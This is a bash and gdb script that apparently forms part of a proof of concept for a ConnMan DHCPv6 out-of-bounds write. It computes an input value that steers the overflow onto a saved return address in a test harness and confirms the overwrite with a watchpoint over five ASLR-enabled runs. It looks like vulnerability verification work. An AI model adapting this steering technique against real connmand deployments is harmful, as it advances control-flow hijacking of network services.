#!/bin/bash
# CVE-2026-115863 — return-address steering check on the natural caller chain.
#
# Uses gdb on the plain-build harness binary p-chain (built by run.sh). At the
# get_domains() entry breakpoint it reads dns_name[] and the saved frame chain,
# computes the saved return address of get_dhcpv6_option_value_list(), solves
# for the K whose first out-of-bounds step lands there
#   (first OOB offset = 1025 + K; target = caller_rbp + 8),
# then sets a hardware watchpoint on that byte and verifies the walk writes
# 0x2E ('.') over it. Run five times with ASLR enabled.
#
# K is layout-specific: the harness adds a run_chain() wrapper and a 16 KiB
# main() canary, so a real connmand build would need a different K. The
# demonstrated fact is that the first OOB step is steerable onto a live
# control-flow-relevant byte, not that K=0x67 is universal.
set -u
cd "$(dirname "$0")" || exit 99
[ -x ./p-chain ] || { echo "run ./run.sh first"; exit 99; }

cat > /tmp/connman-retarget.gdb <<'EOF'
set pagination off
set confirm off
set disable-randomization off
break get_domains
run 0x80
set $caller_rbp = *(void **)$rbp
set $ret_slot = $caller_rbp + 8
set $k = (unsigned long)$ret_slot - (unsigned long)&dns_name[0] - 1025
printf "LAYOUT DNS=%p RET_SLOT=%p K=%lu\n", &dns_name[0], $ret_slot, $k
quit
EOF
LAYOUT=$(gdb -batch -x /tmp/connman-retarget.gdb ./p-chain 2>/dev/null \
         | grep -oE 'LAYOUT DNS=[^ ]+ RET_SLOT=[^ ]+ K=[0-9]+')
[ -n "$LAYOUT" ] || { echo "LAYOUT probe failed"; exit 1; }
K=$(printf '%s\n' "$LAYOUT" | grep -oE 'K=[0-9]+' | cut -d= -f2)
printf '%s\n' "$LAYOUT"

cat > /tmp/connman-retarget-watch.gdb <<EOF
set pagination off
set confirm off
set disable-randomization off
break get_domains
run 0x$(printf '%x' "$K")
set \$caller_rbp = *(void **)\$rbp
set \$ret_slot = \$caller_rbp + 8
printf "WATCH RET_SLOT=%p BEFORE=%02x\n", \$ret_slot, *(unsigned char *)\$ret_slot
watch *(unsigned char *)\$ret_slot
continue
printf "WATCH HIT NOW=%02x\n", *(unsigned char *)\$ret_slot
quit
EOF
HITS=0
for n in 1 2 3 4 5; do
	OUT=$(gdb -batch -x /tmp/connman-retarget-watch.gdb ./p-chain 2>/dev/null)
	BEFORE=$(printf '%s\n' "$OUT" | grep -oE 'BEFORE=[0-9a-f]+' | cut -d= -f2)
	AFTER=$(printf '%s\n' "$OUT" | grep -oE 'NOW=[0-9a-f]+' | cut -d= -f2)
	printf 'run=%d K=0x%x BEFORE=%s AFTER=%s\n' "$n" "$K" "$BEFORE" "$AFTER"
	[ "$BEFORE" = "33" ] && [ "$AFTER" = "2e" ] && HITS=$((HITS + 1))
done
printf 'RETARGET_K=0x%x HITS=%d/5\n' "$K" "$HITS"
[ "$HITS" -eq 5 ]
